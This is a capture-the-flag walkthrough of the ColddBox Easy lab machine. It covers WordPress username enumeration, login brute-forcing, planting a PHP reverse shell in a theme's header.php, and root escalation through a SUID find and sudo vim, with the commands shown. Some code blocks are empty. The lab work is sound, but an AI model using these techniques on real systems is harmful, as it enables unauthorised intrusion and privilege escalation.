Nothing in 'robots.txt'.

Going to '/wp-links-opml.php' we can find wordpress version (might be useful to search for exploits)
```xml

		<title>Links for ColddBox</title>
		<dateCreated>Tue, 08 Nov 2022 05:31:49 GMT</dateCreated>
		<!-- generator="WordPress/4.1.31" -->
	</head>
	<body> </body>
</opml>
```

Going to '/wp-includes' we can see lots of files.

Going to '/hidden' we are greated with this page
```
U-R-G-E-N-T
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```

Maybe 'C0ldd', hugo' or 'philip' are usernames.

Going to '/wp-admin' is a login page.

Trying the obvious 'admin:admin', 'admin:password', etc... Nothing.

However, when trying random usernames we get an error
```
ERROR: Invalid username. Lost your password?
```

But when trying with 'C0ldd', 'hugo' or 'philip' we get
```
ERROR: The password you entered for the username hugo is incorrect. Lost your password?
ERROR: The password you entered for the username philip is incorrect. Lost your password?
ERROR: The password you entered for the username C0ldd is incorrect. Lost your password?
```

Which seem to indicate these usernames exists.

In the meantime, ```nikto``` found that 'xmlrpc.php' is present. Going there reveal
```
XML-RPC server accepts POST requests only.
```

Tried to play with xmlrpc, but could even list the methods available. Tried with Python and BurpSuite, and only got 500 Internal Error message.

Bruteforcing logins with ```wpscan``` we get
```

Now that we logged in as 'admin' let see what we can do. I searched to upload a file, but it seems not that easy.

However, if we go to 'Appearance -> Editor' we can modify existing php files.

I modified 'header.php' to include the php reverse shell from pentest monkey.

Then I started pwncat
```
cd /opt/pwncat
poetry shell
pwncat-cs -lp 9999
```

Then, I went to 'http://$IP/wp-content/themes/twentyfifteen/header.php'

And I got a shell. We can see the user flag in `c0ldd` home directory but we don't have permissions.

Let's check the '/var/www/html' directory
```
```

Let's check the 'wp-config.php'
```php

After running ```linpeas.sh``` we get the following interesting line
```
-rwsr-xr-x 1 root root 217K Feb  8  2016 /usr/bin/find
```

From GTFObins [1] we see
```
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

sudo install -m =xs $(which find) .

./find . -exec /bin/sh -p \; -quit
```

Running this command, we get root
```
(remote) www-data@ColddBox-Easy:/dev/shm$ /usr/bin/find . -exec /bin/sh -p \; -quit
(remote) root@ColddBox-Easy:/dev/shm$          
(remote) root@ColddBox-Easy:/dev/shm$ whoami
root
```

Let's get the flags

For user first
```
(remote) root@ColddBox-Easy:/dev/shm$ cat /home/c0ldd/user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

Then root
```
(remote) root@ColddBox-Easy:/dev/shm$ cat /root/root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

## Flag

```

2. Privesc

```
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

## To Go Further

I'm not sure this is how it was supposed to be done, as we never managed to login as 'c0ldd'. I tried password '9876543210' but it didn't work.

After looking at a write-up, it turns out the password we found for the database 'cybersecurity' was also the password for the user 'c0ldd' on the machine. I thought I tested that, but I might have typed in wrong.

Then after we can check what he can sudo
```
(remote) c0ldd@ColddBox-Easy:/dev/shm$ sudo -l
[sudo] password for c0ldd: cybersecurity
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

If he can run ```vim``` we can use the same method as in previous challenges, where we execute commands in vim, such as ```:!/bin/bash -p``` and we get root access too
```
(remote) c0ldd@ColddBox-Easy:/dev/shm$ sudo /usr/bin/vim
<enter command :!/bin/bash -p>
root@ColddBox-Easy:/dev/shm# whoami
root
```
